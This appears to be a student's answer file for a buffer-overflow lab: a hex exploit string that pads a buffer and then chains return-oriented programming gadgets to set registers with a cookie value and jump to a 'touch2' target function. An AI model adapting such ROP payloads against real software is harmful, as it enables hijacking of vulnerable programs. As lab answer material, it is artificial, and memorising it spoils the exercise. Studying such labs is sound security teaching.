00 00 00 00 00 00 00 00 00 00 /* buffer size */
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00
88 19 40 00 00 00 00 00       /* pop value */
a2 59 d6 4e 00 00 00 00       /* cookie */
37 19 40 00 00 00 00 00       /* rax */
72 19 40 00 00 00 00 00       /* rdi */
88 19 40 00 00 00 00 00       /* pop value */
08 f3 7c e4 00 00 00 00       /* cookie ^ 0xaaaaaaaa */
59 19 40 00 00 00 00 00       /* rdx */
30 19 40 00 00 00 00 00       /* rcx */
46 19 40 00 00 00 00 00       /* rsi */
1b 16 40 00 00 00 00 00       /* touch2 */
